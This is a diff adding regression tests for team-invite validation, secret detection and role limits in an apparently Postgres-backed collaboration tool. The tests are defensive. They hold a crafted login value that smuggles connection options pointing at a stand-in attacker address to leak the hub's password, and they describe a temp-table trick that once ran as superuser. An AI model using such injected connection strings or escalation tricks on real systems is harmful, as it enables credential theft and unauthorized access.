@@ -45,7 +45,60 @@ class FolderTests(unittest.TestCase):
                 pl.home_ledger()
 
 
+class HubInputTests(unittest.TestCase):
+    def test_an_invite_cannot_carry_connection_options(self):
+        """A login like "u host=127.0.0.1 hostaddr=<attacker> password=" sent the hub's own
+        password to the attacker."""
+        import base64
+        import json
+
+        def code(**changes):
+            value = {"h": ["10.0.0.1"], "p": 54329, "u": "gm_m_minji_ab12cd", "k": "k",
+                     "n": "n", **changes}
+            return pl.TEAM_PREFIX + base64.urlsafe_b64encode(json.dumps(value).encode()).decode()
+        self.assertEqual(pl._decode_team(code())["u"], "gm_m_minji_ab12cd")
+        for bad in ({"u": "x host=127.0.0.1 hostaddr=203.0.113.9 password="},
+                    {"h": ["10.0.0.1 sslmode=disable"]}, {"h": ["a@b"]}, {"p": 0}):
+            with self.assertRaisesRegex(ValueError, "INVALID_TEAM_CODE"):
+                pl._decode_team(code(**bad))
+
+    def test_a_key_in_a_reference_or_a_link_is_not_shared(self):
+        root = Path(tempfile.mkdtemp())
+        with mock.patch.dict(os.environ, {"GRAPH_MIND_CONFIG": str(root / "config.json")}):
+            ledger = pl.ledgers()[0][0]
+            ledger.create_project("solo", "me")
+            key = "sk-" + "a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6"
+            with self.assertRaisesRegex(ValueError, "SECRET_IN_CHECKPOINT"):
+                ledger.publish("solo", "progress", "ok", "me", source_refs=[key])
+            with self.assertRaisesRegex(ValueError, "SECRET_IN_CHECKPOINT"):
+                ledger.attach("solo", f"https://example.com/x?api_key={key}", "doc", "me")
+            ledger.db.close()
+
+
 class TeamHubTests(unittest.TestCase):
+    def test_teammates_cannot_reach_past_their_roles(self):
+        """Codex round 9: a temporary table shadowing hub_template ran as superuser; the host's
+        own account could be removed (its personal memory tables went with it); a sole owner's
+        projects could be handed to themselves on the way out."""
+        import psycopg
+        owner = pl.own_ledger()
+        owner.create_project("alpha", "yohan")
+        owner.db.close()
+        with mock.patch.object(sharing, "_firewall", return_value="open"):
+            minji_code = pl.invite("minji", "owner", ["alpha"], "yohan")["team_code"]
+        minji = pl._team_ledger(minji_code)
+        with self.assertRaises(psycopg.Error):
+            minji.db.execute("CREATE TEMP TABLE hub_template(id int, ddl text)")
+        minji.db.close()
+        minji = pl._team_ledger(minji_code)
+        self.assertTrue(minji.create_project("beta", "minji")["created"])
+        minji.db.close()
+        with self.assertRaisesRegex(ValueError, "HOST_ACCOUNT"):
+            pl.remove_account("yohan")
+        with self.assertRaisesRegex(ValueError, "SAME_ACCOUNT"):
+            pl.remove_account("minji", transfer_to="minji")
+        self.assertIn("minji", [a["member"] for a in pl.accounts()])
+
     def setUp(self):
         self.root = Path(tempfile.gettempdir()) / f"graph-mind-team-{os.getpid()}-{time.time_ns()}"
         self.root.mkdir()
